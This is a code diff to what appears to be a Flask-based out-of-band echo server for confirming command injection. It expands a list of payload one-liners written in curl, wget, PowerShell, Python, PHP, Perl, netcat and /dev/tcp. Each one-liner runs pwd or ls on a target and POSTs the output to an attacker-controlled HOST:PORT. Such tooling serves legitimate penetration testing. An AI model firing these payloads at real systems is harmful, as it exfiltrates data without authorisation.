@@ -20,9 +20,16 @@ def handle_record(record: EchoRecord):
 # SOME
 
 PAYLOADS = [
-    f"curl http://{HOST}:{PORT}/$(pwd)",
     f"pwd | curl --data-binary @- http://{HOST}:{PORT}/",
-    f"pwd | powershell -Command \"Invoke-RestMethod -Uri 'http://{HOST}:{PORT}/' -Method POST -Body ([Console]::In.ReadToEnd())\"",
+    f'wget --method=POST --body-data="$(pwd)" http://{HOST}:{PORT}/ -O -',
+    f'ls | powershell -c "irm -Uri http://{HOST}:{PORT}/ -Method POST -Body ([Console]::In.ReadToEnd())"',
+    f'python3 -c \'import os,socket;b=os.popen("pwd").read();s=socket.create_connection(("{HOST}",{PORT}));s.send(b"POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:%d\\r\\n\\r\\n%b"%(len(b),b.encode()))\'',
+    f'python2 -c \'import os,socket;b=os.popen("pwd").read();s=socket.create_connection(("{HOST}",{PORT}));s.send("POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:%d\\r\\n\\r\\n%%s"%(len(b),b))\'',
+    f'php -r \'$b=`pwd`; $s=fsockopen("{HOST}",{PORT}); fwrite($s,"POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:".strlen($b)."\\r\\n\\r\\n$b");\'',
+    f'perl -e \'use IO::Socket::INET;$b=`pwd`;IO::Socket::INET->new(PeerAddr=>"{HOST}",PeerPort=>{PORT})->send("POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:".length($b)."\\r\\n\\r\\n$b")\'',
+    f'b=$(pwd); echo -ne "POST / HTTP/1.1\\r\\nHost: x\\r\\nContent-Length:${{#b}}\\r\\n\\r\\n$b" | nc {HOST} {PORT}',
+    f'b=$(pwd); echo -ne "POST / HTTP/1.1\\r\\nHost: x\\r\\nContent-Length: ${{#b}}\\r\\n\\r\\n$b" > /dev/tcp/{HOST}/{PORT}',
+    f"curl http://{HOST}:{PORT}/$(pwd)",
 ]
 
 TEMPLATE = """
@@ -202,7 +209,8 @@ def echo():
     return "Ok"
 
 
-@app.route("/<path:data>", methods=["GET"])
+# get 会触发浏览器favicon.ico请求
+@app.route("/<path:data>", methods=["POST"])
 def echo_path(data):
     er = EchoRecord(request)
     er.data = data
